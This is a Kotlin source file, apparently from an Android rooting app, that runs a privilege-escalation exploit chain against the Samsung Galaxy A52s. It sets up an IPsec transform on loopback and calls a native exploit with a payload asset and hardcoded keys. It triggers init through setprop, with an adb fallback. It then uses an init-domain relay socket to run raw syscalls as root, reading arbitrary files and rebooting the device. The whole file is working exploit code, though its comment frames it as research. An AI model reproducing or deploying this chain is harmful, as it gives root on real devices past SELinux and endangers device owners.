package org.opencrown.app.root

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.net.LocalSocket
import android.net.LocalSocketAddress
import android.util.Log
import java.io.File
import java.net.InetAddress
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

/**
 * A52s temporary init-domain root.
 *
 * The chain is the page-cache/IPsec primitive verified on SM-A528B:
 * A52 libbase page-cache patch, followed by the init relay.
 * The payload asset is our A52 adaptation (no-fork, accept-retry).
 *
 * This is deliberately a research feature, not a silent capability. It asks
 * for an init-log trigger through `setprop`; if the app's SELinux policy denies
 * that property write, the same trigger can be supplied over ADB.
 */
class A52RootChain(private val context: Context) {
    interface Listener {
        fun onLog(line: String)
    }

    private external fun nativeExploit(
        encapPort: Int,
        spi: Int,
        payload: ByteArray,
        keys: ByteArray,
        hmacTruncBytes: Int,
        callback: Any,
    ): String?

    /** Callback used by the native exploit. */
    @Suppress("unused")
    fun onNativeProgress(message: String) {
        listener?.onLog(message)
    }

    @Volatile
    private var listener: Listener? = null

    fun run(listener: Listener) {
        this.listener = listener
        synchronized(RUN_LOCK) {
            var ipsec: IpSecManager? = null
            var spi: IpSecManager.SecurityParameterIndex? = null
            var encap: IpSecManager.UdpEncapsulationSocket? = null
            var transform: IpSecTransform? = null
            try {
                val payload = context.assets.open(PAYLOAD_ASSET).use { it.readBytes() }
                require(payload.size == 576) { "unexpected payload size ${payload.size}" }

                ipsec = context.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
                    ?: error("IpSecManager unavailable")
                val loopback = InetAddress.getByName("127.0.0.1")
                spi = ipsec.allocateSecurityParameterIndex(loopback)
                val crypt = IpSecAlgorithm("cbc(aes)", AES_CBC_KEY)
                val auth = IpSecAlgorithm("hmac(sha256)", HMAC_SHA256_KEY, HMAC_TRUNC_BITS)
                encap = ipsec.openUdpEncapsulationSocket()
                val port = encap.port
                transform = IpSecTransform.Builder(context)
                    .setEncryption(crypt)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encap, port)
                    .buildTransportModeTransform(loopback, spi)

                val keys = ByteArray(64)
                System.arraycopy(AES_CBC_KEY, 0, keys, 0, 32)
                System.arraycopy(HMAC_SHA256_KEY, 0, keys, 32, 32)
                val result = nativeExploit(port, spi.spi, payload, keys, HMAC_TRUNC_BITS / 8, this)
                listener.onLog(result ?: "native exploit returned no result")
            } catch (t: Throwable) {
                Log.e(TAG, "A52 root exploit failed", t)
                listener.onLog("exploit failed: ${t.javaClass.simpleName}: ${t.message}")
            } finally {
                runCatching { transform?.close() }
                runCatching { encap?.close() }
                runCatching { spi?.close() }
                runCatching { ipsec?.let { } }
            }
        }
    }

    /**
     * Trigger init's libbase logger. The untrusted app may be denied; the
     * returned text tells the caller whether the ADB fallback is required.
     */
    fun triggerInitLog(): String {
        val attempts = listOf(
            arrayOf("/system/bin/setprop", "debug.opencrown.a52", "1"),
            arrayOf("/system/bin/sh", "-c", "setprop debug.opencrown.a52 1"),
        )
        for (cmd in attempts) {
            try {
                val process = ProcessBuilder(*cmd).redirectErrorStream(true).start()
                val finished = process.waitFor(2, TimeUnit.SECONDS)
                val output = process.inputStream.bufferedReader().readText().trim()
                if (!finished) process.destroyForcibly()
                if (finished && process.exitValue() == 0) {
                    return "init trigger accepted: ${cmd.joinToString(" ")}"
                }
                if (output.isNotEmpty()) return "init trigger denied: $output"
            } catch (t: Throwable) {
                Log.w(TAG, "trigger attempt failed", t)
            }
        }
        return "init trigger denied; run: adb shell setprop debug.opencrown.a52 1"
    }

    /** Read a file through the init relay. */
    fun readRootFile(path: String): String? = relayReadFile(path)

    /** Read uid/gid and SELinux context from the relay. */
    fun rootIdentity(): String? {
        val status = relayReadFile("/proc/self/status") ?: return null
        val attr = relayReadFile("/proc/self/attr/current") ?: ""
        val uid = status.lineSequence().firstOrNull { it.startsWith("Uid:") } ?: "Uid: ?"
        return "$uid\ncontext=$attr"
    }

    /** Reboot through the init-domain relay; root disappears on the next boot. */
    fun reboot(): String {
        return try {
            Relay().use { it.syscall(SYS_REBOOT, LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
                LINUX_REBOOT_CMD_RESTART, 0, 0, 0, 0, ByteArray(0)) }
            "reboot requested"
        } catch (t: Throwable) {
            "reboot failed: ${t.message}"
        }
    }

    private fun relayReadFile(path: String): String? {
        return try {
            Relay().use { relay ->
                val fd = relay.syscall(SYS_OPENAT, AT_FDCWD, 0, 0, 0, 0, 0, FLAG_X1_DATA,
                    path.toByteArray(Charsets.UTF_8) + byteArrayOf(0))
                if (fd < 0) return null
                val data = ByteArray(4096)
                val n = relay.syscall(SYS_READ, fd, 0, data.size.toLong(), 0, 0, 0, FLAG_X1_DATA, data)
                val out = relay.lastData.copyOf(n.coerceIn(0L, data.size.toLong()).toInt())
                relay.syscall(SYS_CLOSE, fd, 0, 0, 0, 0, 0, 0, ByteArray(0))
                if (n <= 0) null else out.toString(Charsets.UTF_8)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "relay read failed for $path", t)
            null
        }
    }

    private class Relay : AutoCloseable {
        private val socket = LocalSocket()
        private val input: java.io.InputStream
        private val output: java.io.OutputStream

        init {
            socket.connect(LocalSocketAddress(RELAY_NAME, LocalSocketAddress.Namespace.ABSTRACT))
            socket.soTimeout = 3000
            input = socket.inputStream
            output = socket.outputStream
        }

        var lastData: ByteArray = ByteArray(0)
            private set

        fun syscall(
            nr: Long, x0: Long, x1: Long, x2: Long, x3: Long, x4: Long, x5: Long,
            flags: Int, data: ByteArray,
        ): Long {
            val page = ByteArray(PAGE_SIZE)
            val header = ByteBuffer.wrap(page).order(ByteOrder.LITTLE_ENDIAN)
            header.putLong(0, nr)
            header.putLong(8, x0)
            header.putLong(16, x1)
            header.putLong(24, x2)
            header.putLong(32, x3)
            header.putLong(40, x4)
            header.putLong(48, x5)
            header.putInt(56, flags)
            val copy = minOf(data.size, DATA_SIZE)
            if (copy > 0) System.arraycopy(data, 0, page, DATA_OFFSET, copy)
            output.write(page)
            output.flush()
            val resp = ByteArray(PAGE_SIZE)
            var off = 0
            while (off < PAGE_SIZE) {
                val n = input.read(resp, off, PAGE_SIZE - off)
                if (n < 0) error("relay closed")
                off += n
            }
            if (resp[PROTO_STATUS_OFF].toInt() and 0xff != PROTO_STATUS_OK) {
                error("relay protocol status 0x${resp[PROTO_STATUS_OFF].toString(16)}")
            }
            lastData = resp.copyOfRange(DATA_OFFSET, PAGE_SIZE)
            return ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getLong(0)
        }

        override fun close() {
            runCatching { socket.close() }
        }
    }

    companion object {
        private const val TAG = "OpenCrownA52"
        private const val PAYLOAD_ASSET = "a52_payload.bin"
        private const val RELAY_NAME = "dfi_init"
        private const val PAGE_SIZE = 4096
        private const val DATA_OFFSET = 64
        private const val DATA_SIZE = PAGE_SIZE - DATA_OFFSET
        private const val PROTO_STATUS_OFF = 60
        private const val PROTO_STATUS_OK = 0xD1
        private const val HMAC_TRUNC_BITS = 128

        private const val FLAG_X0_DATA = 1
        private const val FLAG_X1_DATA = 2
        private const val AT_FDCWD = -100L
        private const val SYS_OPENAT = 56L
        private const val SYS_CLOSE = 57L
        private const val SYS_READ = 63L
        private const val SYS_REBOOT = 142L
        private const val LINUX_REBOOT_MAGIC1 = 0xfee1deadL
        private const val LINUX_REBOOT_MAGIC2 = 672274793L
        private const val LINUX_REBOOT_CMD_RESTART = 0x1234567L

        private val AES_CBC_KEY = "ABCDEFGHIJKLMNOPQRSTUVWXYZ012345".toByteArray(Charsets.US_ASCII)
        private val HMAC_SHA256_KEY = "HMACKEY_FOR_DIRTYINIT_CBC_MODE!!".toByteArray(Charsets.US_ASCII)
        private val RUN_LOCK = Any()

        init {
            System.loadLibrary("a52root")
        }
    }
}
